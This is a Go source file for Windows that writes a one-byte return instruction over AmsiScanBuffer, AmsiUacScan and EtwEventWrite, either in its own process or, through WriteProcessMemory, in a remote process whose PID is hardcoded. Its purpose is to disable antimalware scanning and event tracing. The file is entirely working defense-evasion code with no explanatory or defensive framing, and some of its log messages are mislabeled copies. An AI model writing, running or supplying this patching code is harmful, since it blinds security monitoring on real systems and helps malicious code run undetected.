package main

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	pid := uint32(13556)

	err := patchAmsiRemote(pid)
	if err != nil {
		log.Fatalf("%v", err)
	}
	err = patchUACRemote(pid)
	if err != nil {
		log.Fatalf("%v", err)
	}

}

func patchAmsiLocal() error {
	fmt.Println("[+] Patching AmsiScanBuffer -- Local Process")
	amsidll, _ := syscall.LoadLibrary("amsi.dll")
	procAmsiScanBuffer, _ := syscall.GetProcAddress(amsidll, "AmsiScanBuffer")

	patch := []byte{0xc3}
	err := PatchLocal(procAmsiScanBuffer, patch)
	if err != nil {
		return err
	}
	fmt.Println("[SUCCESS] Patched AmsiScanBuffer -- Local Process")
	return nil
}

func patchEtwLocal() error {
	fmt.Println("[+] Patching EtwEventWrite -- Local Process")
	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
	procEtwEventWrite, _ := syscall.GetProcAddress(ntdll, "EtwEventWrite")
	patch := []byte{0xC3}
	err := PatchLocal(procEtwEventWrite, patch)
	if err != nil {
		return err
	}
	fmt.Println("[SUCCESS] Patched EtwEventWrite -- Local Process")
	return nil
}

func patchAmsiRemote(pid uint32) error {
	fmt.Printf("[+] Patching AmsiScanBuffer -- Remote Process PID: %d \n", pid)
	amsidll, _ := syscall.LoadLibrary("amsi.dll")
	procAmsiScanBuffer, _ := syscall.GetProcAddress(amsidll, "AmsiScanBuffer")
	patch := []byte{0xc3}
	err := PatchRemote(pid, procAmsiScanBuffer, patch)
	if err != nil {
		return err
	}
	fmt.Printf("[SUCCESS] Patched AmsiScanBuffer -- Remote Process PID: %d \n", pid)

	return nil
}

func patchUACRemote(pid uint32) error {
	fmt.Printf("[+] Patching AmsiScanBuffer -- Remote Process PID: %d \n", pid)
	amsidll, _ := syscall.LoadLibrary("amsi.dll")
	procAmsiScanBuffer, _ := syscall.GetProcAddress(amsidll, "AmsiUacScan")
	patch := []byte{0xc3}
	err := PatchRemote(pid, procAmsiScanBuffer, patch)
	if err != nil {
		return err
	}
	fmt.Printf("[SUCCESS] Patched AmsiScanBuffer -- Remote Process PID: %d \n", pid)

	return nil
}

func patchEtwRemote(pid uint32) error {
	fmt.Printf("[+] Patching EtwEventWrite -- Remote Process PID: %d \n", pid)
	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
	procEtwEventWrite, _ := syscall.GetProcAddress(ntdll, "EtwEventWrite")
	patch := []byte{0xC3}
	err := PatchRemote(pid, procEtwEventWrite, patch)
	if err != nil {
		return err
	}
	fmt.Printf("[SUCCESS] Patched EtwEventWrite -- Remote Process PID: %d \n", pid)
	return nil
}

// Write a patch locally
func PatchLocal(address uintptr, patch []byte) error {
	// Add write permissions
	var oldprotect uint32
	err := windows.VirtualProtect(address, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldprotect)
	if err != nil {
		return fmt.Errorf("[Error] Failed to change memory permissions for 0x%x: %v", address, err)
	}
	modntdll := syscall.NewLazyDLL("Ntdll.dll")
	procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")

	// Write Patch
	procrtlMoveMemory.Call(address, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)))
	fmt.Printf("[+] Wrote patch at destination address 0x%x\n", address)

	// Restore memory permissions
	err = windows.VirtualProtect(address, uintptr(len(patch)), oldprotect, &oldprotect)
	if err != nil {
		return fmt.Errorf("[Error] Failed to change memory permissions for 0x%x: %v", address, err)
	}
	return nil
}

// Write a patch on a remote process
func PatchRemote(pid uint32, address uintptr, patch []byte) error {

	// Get handle on remote process
	pHandle, err := windows.OpenProcess(
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION,
		false,
		pid)
	if err != nil {
		return fmt.Errorf("[ERROR] Unable to get a handle on process %d, %v", pid, err)
	}

	// Write to process memory
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(
		pHandle,
		address,
		&patch[0],
		uintptr(len(patch)),
		&numberOfBytesWritten)

	if err != nil {
		return fmt.Errorf("[ERROR] WriteProcessMemory failed, %v", err)
	}
	fmt.Printf("[+] Wrote patch at destination address 0x%x\n", address)

	return nil
}
